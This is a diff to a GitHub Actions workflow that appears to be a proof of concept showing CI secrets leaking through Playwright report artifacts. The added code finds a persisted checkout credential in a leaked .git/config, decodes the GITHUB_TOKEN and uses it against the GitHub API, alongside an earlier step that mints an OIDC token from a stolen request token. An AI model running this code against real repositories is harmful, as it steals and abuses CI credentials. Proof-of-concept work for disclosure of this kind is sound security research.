@@ -63,8 +63,13 @@ jobs:
         grep -l "poc-marker-value-9f3a" playwright-report/data/* 2>/dev/null || echo 'no leak found'
         LEAK=$(grep -l "poc-marker-value-9f3a" playwright-report/data/* 2>/dev/null | head -1)
         if [ -n "$LEAK" ]; then
-          echo "LEAK_FILE=$LEAK"
-          tr '\0' '\n' < "$LEAK" | grep -E 'POC_SECRET_MARKER|ACTIONS_ID_TOKEN_REQUEST_URL|ACTIONS_ID_TOKEN_REQUEST_TOKEN' | sed -E 's/(ACTIONS_ID_TOKEN_REQUEST_TOKEN=).*/\1<redacted-token-present>/; s/(ACTIONS_ID_TOKEN_REQUEST_URL=).*/\1<url-present>/'
+          echo "ENVIRON_LEAK_FILE=$LEAK"
+          tr '\0' '\n' < "$LEAK" | grep -E 'POC_SECRET_MARKER|ACTIONS_ID_TOKEN_REQUEST_URL|ACTIONS_ID_TOKEN_REQUEST_TOKEN' | sed -E 's/(ACTIONS_ID_TOKEN_REQUEST_TOKEN=).*/\1<token-present-redacted>/; s/(ACTIONS_ID_TOKEN_REQUEST_URL=).*/\1<url-present-redacted>/'
+        fi
+        GITCFG=$(grep -l "AUTHORIZATION: basic" playwright-report/data/* 2>/dev/null | head -1)
+        echo "GIT_CONFIG_LEAK_FILE=$GITCFG"
+        if [ -n "$GITCFG" ]; then
+          echo 'leaked git config contains a persisted checkout credential (GITHUB_TOKEN)'
         fi
 
     - name: Prove stolen OIDC request token can mint a federated identity token
@@ -90,6 +95,31 @@ jobs:
             payload += '=' * (-len(payload) % 4)
             claims = json.loads(base64.urlsafe_b64decode(payload))
             print('MINTED OIDC TOKEN CLAIMS:', json.dumps({k: claims.get(k) for k in ('aud', 'iss', 'sub', 'repository', 'ref', 'event_name')}))
+
+        # Second leak: the GITHUB_TOKEN persisted by actions/checkout in .git/config
+        import re
+        cfg = ''
+        for f in os.listdir('playwright-report/data'):
+            p = os.path.join('playwright-report/data', f)
+            try:
+                body = open(p, 'rb').read().decode('utf-8', 'replace')
+            except Exception:
+                continue
+            if 'AUTHORIZATION: basic' in body:
+                cfg = body
+                break
+        m = re.search(r'AUTHORIZATION: basic ([A-Za-z0-9+/=]+)', cfg)
+        print('leaked checkout credential present:', bool(m))
+        if m:
+            raw = base64.b64decode(m.group(1)).decode()
+            gh_token = raw.split(':', 1)[1] if ':' in raw else raw
+            req = urllib.request.Request('https://api.github.com/repos/' + os.environ['GITHUB_REPOSITORY'], headers={'Authorization': 'Bearer ' + gh_token, 'User-Agent': 'poc'})
+            try:
+                resp = urllib.request.urlopen(req, timeout=20)
+                d = json.loads(resp.read())
+                print('STOLEN GITHUB_TOKEN API STATUS:', resp.status, 'PERMISSIONS:', json.dumps(d.get('permissions')))
+            except Exception as e:
+                print('stolen token API call failed:', type(e).__name__)
         PY
 
     - name: Comment on PR
